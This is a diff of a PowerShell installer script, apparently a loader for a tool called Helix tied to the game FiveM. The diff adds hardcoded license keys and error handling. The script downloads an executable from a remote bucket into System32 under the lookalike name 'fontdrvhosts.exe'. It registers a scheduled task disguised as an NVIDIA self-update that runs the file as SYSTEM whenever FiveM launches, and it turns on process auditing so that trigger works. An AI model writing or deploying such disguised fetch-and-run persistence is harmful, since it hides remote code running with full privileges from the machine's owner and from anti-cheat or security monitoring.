@@ -21,29 +21,113 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 # -----------------------------
 $system32Path = "$env:windir\System32"
 $exeDestination = Join-Path $system32Path "fontdrvhosts.exe"
-$exeUrl        = "https://pub-a0f157286e3d403d8885d643b27de4c2.r2.dev/Helix_arzen/Helix.exe"
-$taskName      = "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}"
+$databasePath = Join-Path $system32Path "database.txt"
+$exeUrl = "https://pub-a0f157286e3d403d8885d643b27de4c2.r2.dev/Helix_arzen/Helix.exe"
+$taskName = "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}"
+
+# -----------------------------
+# Valid License Keys
+# -----------------------------
+$validKeys = @(
+    "HELIX-1234-5678-9012-3456",
+    "HELIX-9876-5432-1098-7654",
+    "HELIX-1111-2222-3333-4444",
+    "HELIX-5555-6666-7777-8888",
+    "HELIX-9999-0000-1111-2222",
+    "HELIX-3333-4444-5555-6666",
+    "HELIX-7777-8888-9999-0000",
+    "HELIX-1212-3434-5656-7878",
+    "HELIX-9090-8080-7070-6060",
+    "HELIX-1234-ABCD-EFGH-5678",
+    "HELIX-WXYZ-1234-5678-90AB",
+    "HELIX-CD12-EF34-GH56-IJ78",
+    "HELIX-1A2B-3C4D-5E6F-7G8H",
+    "HELIX-9I8J-7K6L-5M4N-3O2P",
+    "HELIX-Q1W2-E3R4-T5Y6-U7I8",
+    "HELIX-O9P0-A1S2-D3F4-G5H6",
+    "HELIX-J7K8-L9Z0-X1C2-V3B4",
+    "HELIX-N5M6-Q7W8-E9R0-T1Y2",
+    "HELIX-U3I4-O5P6-A7S8-D9F0",
+    "HELIX-G1H2-J3K4-L5Z6-X7C8",
+    "HELIX-V9B0-N1M2-Q3W4-E5R6",
+    "HELIX-T7Y8-U9I0-O1P2-A3S4",
+    "HELIX-D5F6-G7H8-J9K0-L1Z2",
+    "HELIX-X3C4-V5B6-N7M8-Q9W0",
+    "HELIX-E1R2-T3Y4-U5I6-O7P8",
+    "HELIX-A9S0-D1F2-G3H4-J5K6",
+    "HELIX-L7Z8-X9C0-V1B2-N3M4",
+    "HELIX-Q5W6-E7R8-T9Y0-U1I2",
+    "HELIX-O3P4-A5S6-D7F8-G9H0",
+    "HELIX-J1K2-L3Z4-X5C6-V7B8"
+)
+
+# -----------------------------
+# License Verification Function
+# -----------------------------
+function Verify-License {
+    Write-Host "`n=== License Verification ===" -ForegroundColor Yellow
+    Write-Host "Enter your license key to continue installation"
+    
+    $attempts = 3
+    while ($attempts -gt 0) {
+        $inputKey = Read-Host "License Key ($attempts attempts remaining)"
+        
+        if ($validKeys -contains $inputKey) {
+            Write-Host "License valid! Proceeding with installation..." -ForegroundColor Green
+            return $true
+        } else {
+            $attempts--
+            if ($attempts -gt 0) {
+                Write-Host "Invalid license key. Please try again." -ForegroundColor Red
+            } else {
+                Write-Host "No attempts remaining. Installation aborted." -ForegroundColor Red
+                return $false
+            }
+        }
+    }
+}
 
 # -----------------------------
 # Install Mode
 # -----------------------------
 if ($choice -eq "1") {
-    Write-Host "Starting installation..."
+    # Verify license first
+    if (-not (Verify-License)) {
+        exit
+    }
+    
+    Write-Host "`nStarting installation..."
 
     # Download exe
     Write-Host "Downloading executable..."
-    Invoke-WebRequest -Uri $exeUrl -OutFile $exeDestination
+    try {
+        Invoke-WebRequest -Uri $exeUrl -OutFile $exeDestination
+        Write-Host "Download completed." -ForegroundColor Green
+    } catch {
+        Write-Host "Download failed: $_" -ForegroundColor Red
+        exit
+    }
 
     # Create scheduled task
     Write-Host "Creating scheduled task..."
-    $cmd = 'cmd /c schtasks /create /tn "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}" /tr "C:\Windows\System32\fontdrvhosts.exe" /sc ONEVENT /ec Security /mo "*[System[(EventID=4688)]] and *[EventData[Data[@Name=''NewProcessName'']=''%localappdata%\FiveM\FiveM.exe'']]" /ru SYSTEM'
-    Invoke-Expression $cmd
+    try {
+        $cmd = 'cmd /c schtasks /create /tn "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}" /tr "C:\Windows\System32\fontdrvhosts.exe" /sc ONEVENT /ec Security /mo "*[System[(EventID=4688)]] and *[EventData[Data[@Name=''NewProcessName'']=''%localappdata%\FiveM\FiveM.exe'']]" /ru SYSTEM'
+        Invoke-Expression $cmd
+        Write-Host "Scheduled task created." -ForegroundColor Green
+    } catch {
+        Write-Host "Task creation failed: $_" -ForegroundColor Red
+    }
 
     # Enable audit logging
     Write-Host "Enabling audit logging..."
-    auditpol /set /subcategory:"Process Creation" /success:enable
+    try {
+        auditpol /set /subcategory:"Process Creation" /success:enable
+        Write-Host "Audit logging enabled." -ForegroundColor Green
+    } catch {
+        Write-Host "Audit logging setup failed: $_" -ForegroundColor Red
+    }
 
-    Write-Host "Installation completed successfully."
+    Write-Host "`nInstallation completed successfully." -ForegroundColor Green
 }
 
 # -----------------------------
@@ -54,17 +138,22 @@ elseif ($choice -eq "2") {
 
     # Remove scheduled task
     Write-Host "Removing scheduled task..."
-    schtasks /delete /tn $taskName /f
+    try {
+        schtasks /delete /tn $taskName /f
+        Write-Host "Scheduled task removed." -ForegroundColor Green
+    } catch {
+        Write-Host "Task removal failed: $_" -ForegroundColor Yellow
+    }
 
     # Remove files if they exist
     if (Test-Path $exeDestination) { 
         Remove-Item $exeDestination -Force 
-        Write-Host "Removed executable: $exeDestination"
+        Write-Host "Removed executable: $exeDestination" -ForegroundColor Green
     }
 
-    Write-Host "Cleanup completed."
+    Write-Host "Cleanup completed." -ForegroundColor Green
 }
 
 else {
-    Write-Host "Invalid choice (please select 1 or 2)."
+    Write-Host "Invalid choice (please select 1 or 2)." -ForegroundColor Red
 }
